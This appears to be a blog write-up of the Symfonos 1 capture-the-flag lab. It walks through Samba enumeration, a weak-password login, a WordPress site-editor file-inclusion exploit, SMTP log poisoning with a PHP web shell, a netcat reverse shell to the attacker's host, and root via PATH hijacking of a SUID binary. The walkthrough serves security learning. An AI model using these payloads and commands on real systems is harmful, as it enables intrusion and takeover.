@@ -1,0 +1,298 @@
+I"�T<p>This is a box created by <strong>zayotic</strong>, is a beginner real life based machine designed to teach a interesting way of obtaining a low priv shell.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>We start to discover the target machine with nmap as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>nmap <span class="nt">-sn</span> <span class="nt">-n</span> 192.168.179.1-254
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-29 16:59 <span class="nt">-05</span>
+Nmap scan report <span class="k">for </span>192.168.179.1
+Host is up.
+Nmap scan report <span class="k">for </span>192.168.179.135
+Host is up <span class="o">(</span>0.00066s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:0C:29:FC:7D:4F <span class="o">(</span>VMware<span class="o">)</span>
+Nmap scan report <span class="k">for </span>192.168.179.254
+Host is up <span class="o">(</span>0.00020s latency<span class="o">)</span><span class="nb">.</span>
+MAC Address: 00:50:56:FC:8B:E8 <span class="o">(</span>VMware<span class="o">)</span>
+Nmap <span class="k">done</span>: 254 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>4.90 seconds
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Identified our target it’s time to perform a TCP and UDP scan with unicornscan.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>us <span class="nt">-Iv</span> <span class="nt">-mT</span> <span class="nt">-p1-65535</span> 192.168.179.135 <span class="o">&amp;&amp;</span> us <span class="nt">-Iv</span> <span class="nt">-mU</span> <span class="nt">-p1-65535</span> 192.168.179.135
+...
+TCP open                     ssh[   22]         from 192.168.179.135  ttl 64 
+TCP open                    smtp[   25]         from 192.168.179.135  ttl 64 
+TCP open                    http[   80]         from 192.168.179.135  ttl 64 
+TCP open             netbios-ssn[  139]         from 192.168.179.135  ttl 64 
+TCP open            microsoft-ds[  445]         from 192.168.179.135  ttl 64 
+...
+</code></pre></div></div>
+<p>Of the scan performed the identified UDP ports were false positives, so I focus to perform the service enumeration of the TCP ports.</p>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>With nmap I perform the banner grabbing of the services running on the open TCP ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-n</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> <span class="nt">-p22</span>,25,80,139,445 192.168.179.135 <span class="nt">-oN</span> nmap-service-enum.txt
+...
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d <span class="o">(</span>ED25519<span class="o">)</span>
+25/tcp  open  smtp        Postfix smtpd
+|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
+|_ssl-date: TLS randomness does not represent <span class="nb">time
+</span>80/tcp  open  http        Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+MAC Address: 00:0C:29:FC:7D:4F (VMware)
+Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+...
+</span></code></pre></div></div>
+
+<h3 id="samba-enumeration">Samba Enumeration</h3>
+
+<p>Then I focus on enumerate the samba service, with the purpose of listing the shared folders, how we can see the <strong>anonymous</strong> folder has read only permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>smbmap <span class="nt">-H</span> 192.168.179.135 
+<span class="o">[</span>+] Guest session       IP: 192.168.179.135:445 Name: 192.168.179.135 
+    Disk                           Permissions     Comment
+    <span class="nt">----</span>                           <span class="nt">-----------</span>     <span class="nt">-------</span>
+    print<span class="nv">$ </span>                        NO ACCESS       Printer Drivers
+    helios                         NO ACCESS       Helios personal share
+    anonymous                      READ ONLY
+    IPC<span class="nv">$ </span>                          NO ACCESS       IPC Service <span class="o">(</span>Samba 4.5.16-Debian<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Later I enumerate for samba users and domains with rpcclient as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 192.168.179.135
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[helios] rid:[0x3e8]
+rpcclient <span class="nv">$&gt;</span> enumdomains
+name:[SYMFONOS] idx:[0x0]
+name:[Builtin] idx:[0x1]
+</code></pre></div></div>
+<p>In the result obtained we can only see the <strong>helios</strong> user, but we cannot acces his shared folder because we don’t know the password, so we try to log in with a null session to the anonymous folder.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>smbclient //192.168.179.135/anonymous <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span>
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Fri Jun 28 20:14:49 2019
+  ..                                  D        0  Fri Jun 28 20:12:15 2019
+  attention.txt                       N      154  Fri Jun 28 20:14:49 2019
+
+                19994224 blocks of size 1024. 17293984 blocks available
+smb: <span class="se">\&gt;</span> get attention.txt
+getting file <span class="se">\a</span>ttention.txt of size 154 as attention.txt <span class="o">(</span>16.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 16.7 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> <span class="nb">exit
+
+</span>root@kali:~/symfonos1<span class="nv">$ </span><span class="nb">cat </span>attention.txt 
+
+Can <span class="nb">users </span>please stop using passwords like <span class="s1">'epidioko'</span>, <span class="s1">'qwerty'</span> and <span class="s1">'baseball'</span><span class="o">!</span> 
+
+Next person I find using one of these passwords will be fired!
+
+<span class="nt">-Zeus</span>
+</code></pre></div></div>
+
+<p>We find the <strong>attention.txt</strong> file, download it and see the content specifying that users stop using weak passwords, possibly a of these belongs to helios user.</p>
+
+<p>Then we try with the following credentials <strong>helios:qwerty</strong> and we have access.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>smbclient //192.168.179.135/helios <span class="nt">-U</span> <span class="s2">"helios"</span>    
+Enter WORKGROUP<span class="se">\h</span>elios<span class="s1">'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Fri Jun 28 19:32:05 2019
+  ..                                  D        0  Fri Jun 28 19:37:04 2019
+  research.txt                        A      432  Fri Jun 28 19:32:05 2019
+  todo.txt                            A       52  Fri Jun 28 19:32:05 2019
+
+                19994224 blocks of size 1024. 17284192 blocks available
+smb: \&gt; get research.txt
+getting file \research.txt of size 432 as research.txt (60.3 KiloBytes/sec) (average 37.3 KiloBytes/sec)
+smb: \&gt; get todo.txt
+getting file \todo.txt of size 52 as todo.txt (6.3 KiloBytes/sec) (average 29.5 KiloBytes/sec)
+smb: \&gt; exit
+
+root@kali:~/symfonos1$ cat research.txt 
+Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
+root@kali:~/symfonos1$ cat todo.txt 
+
+1. Binge watch Dexter
+2. Dance
+3. Work on /h3l105
+</span></code></pre></div></div>
+<p>We found two files we download it and we see at the bottom of the <strong>todo.txt</strong> file the word <strong>h3l105</strong>, this is possibly a directory name.</p>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>We check with the browser the h3l105 directory, but the web page doesn’t resolv, to work around this problem assign the following instruction to the hosts file, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"192.168.179.135 symfonos.local"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</code></pre></div></div>
+
+<p>Solved the problem, we see that it’s a wordpress CMS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://symfonos.local/h3l105/
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos1/screenshot-1.png" alt="" /></p>
+
+<p>Then I fire wpscan to find potetial vulnerabilities in wordpress CMS, and I find the <strong>site-editor version 1.1.1</strong>, which is vulnerable to Local File Inclusion.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://symfonos.local/h3l105/ 
+...
+<span class="o">[</span>+] site-editor
+ | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
+ | Latest Version: 1.1.1 <span class="o">(</span>up to <span class="nb">date</span><span class="o">)</span>
+ | Last Updated: 2017-05-02T23:34:00.000Z
+ |
+ | Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |
+ | Version: 1.1.1 <span class="o">(</span>80% confidence<span class="o">)</span>
+ | Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
+ |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt
+ ...
+</code></pre></div></div>
+<p>I found the exploit in <a href="https://www.exploit-db.com/exploits/44340">exploitdb</a>, downloaded it and analyzed the proof of concept.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>wget https://www.exploit-db.com/download/44340
+root@kali:~/symfonos1<span class="nv">$ </span><span class="nb">cat </span>44340
+...
+ <span class="k">**</span> Proof of Concept <span class="k">**</span>
+http://&lt;host&gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/etc/passwd
+...
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="local-file-inclusion">Local File Inclusion</h3>
+
+<p>Later I check the proof of concept requesting the system <strong>passwd</strong> file and we obtain its content.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/etc/passwd
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos1/screenshot-2.png" alt="" /></p>
+
+<p>If we remember the SMTP service is running, so I verify if it’s possible to inject the logs file, and how we can see the helios log file is getting, note the helios mail address, note we found the helios mail address.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/var/mail/helios
+</code></pre></div></div>
+<p><img src="/assets/images/symfonos1/screenshot-3.png" alt="" /></p>
+
+<h3 id="smtp-log-poisoning">SMTP Log Poisoning</h3>
+<p>With the helios mail address, we will try to send you an email with an injected web shell, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>nc 192.168.179.135 25 
+220 symfonos.localdomain ESMTP Postfix <span class="o">(</span>Debian/GNU<span class="o">)</span>
+VRFY helios@symfonos.localdomain 
+252 2.0.0 helios@symfonos.localdomain
+MAIL FROM:s4rgaz@mail.com
+250 2.1.0 Ok
+RCPT TO:helios@symfonos.localdomain 
+250 2.1.5 Ok
+DATA
+354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+&lt;?php passthru<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;
+<span class="nb">.</span>
+250 2.0.0 Ok: queued as C062B40833
+quit
+221 2.0.0 Bye
+</code></pre></div></div>
+<p>Then we try to execute the uname command by sending it as a parameter and we get the result.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>curl <span class="nt">-s</span> http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/var/mail/helios<span class="se">\&amp;</span><span class="nv">cmd</span><span class="o">=</span><span class="nb">uname</span>%20-a
+...
+
+Linux symfonos 4.9.0-9-amd64 <span class="c">#1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux</span>
+
+<span class="o">{</span><span class="s2">"success"</span>:true,<span class="s2">"data"</span>:<span class="o">{</span><span class="s2">"output"</span>:[]<span class="o">}}</span>
+</code></pre></div></div>
+
+<p><strong>Getting a reverse shell</strong></p>
+
+<p>Set up a netcat listener on port 443 and run the netcat reverse shell, and finally we have a low privileges shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>curl <span class="nt">-s</span> http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="o">=</span>/var/mail/helios<span class="se">\&amp;</span><span class="nv">cmd</span><span class="o">=</span>nc%20192.168.179.1%20443%20-e%20/bin/bash
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/symfonos1<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.135] 47738
+which python
+/usr/bin/python
+python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
+&lt;ite-editor/editor/extensions/pagebuilder/includes<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="path-hijacking">Path Hijacking</h3>
+<p>Enumerting for SUID permissions I found the <strong>statuscheck</strong> binary, witch catches my attention.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helios@symfonos:/var/www/html/h3l105<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/opt/statuscheck
+/bin/mount
+/bin/umount
+/bin/su
+/bin/ping
+</code></pre></div></div>
+<p>I execute the binary and I see that it’s getting the request headers.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helios@symfonos:/var/www/html/h3l105<span class="nv">$ </span>/opt/statuscheck
+HTTP/1.1 200 OK  
+Date: Sat, 29 May 2021 18:57:19 GMT 
+Server: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span> 
+Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT 
+ETag: <span class="s2">"148-58c6b9bb3bc5b"</span> 
+Accept-Ranges: bytes  
+Content-Length: 328        
+Vary: Accept-Encoding       
+Content-Type: text/html
+</code></pre></div></div>
+<p>Analysing the binary with the strings command, I can see that it’s executing the curl utility, so I will try to hijack the path.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helios@symfonos:/var/www/html/h3l105<span class="nv">$ </span>strings /opt/statuscheck
+...
+_ITM_registerTMCloneTable 
+GLIBC_2.2.5  
+curl <span class="nt">-I</span> H 
+http://lH 
+ocalhostH
+...
+</code></pre></div></div>
+<p>I export my current directory to the <strong>PATH</strong> environment variable, then I redirect with echo the <strong>/bin/dash</strong> command to the curl file, assign execution permissions to it, and finally run the statuscheck binary thus obtaining root access to this machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+<span class="nb">echo</span> <span class="nv">$PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
+<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/dev/shm:<span class="nv">$PATH</span>
+helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
+<span class="nb">echo</span> <span class="nv">$PATH</span>
+/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/dash'</span> <span class="o">&gt;</span> curl 
+helios@symfonos:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x curl 
+helios@symfonos:/dev/shm<span class="nv">$ </span>/opt/statuscheck 
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>helios<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>
+<span class="c"># whoami</span>
+root
+</code></pre></div></div>
+
+:ET
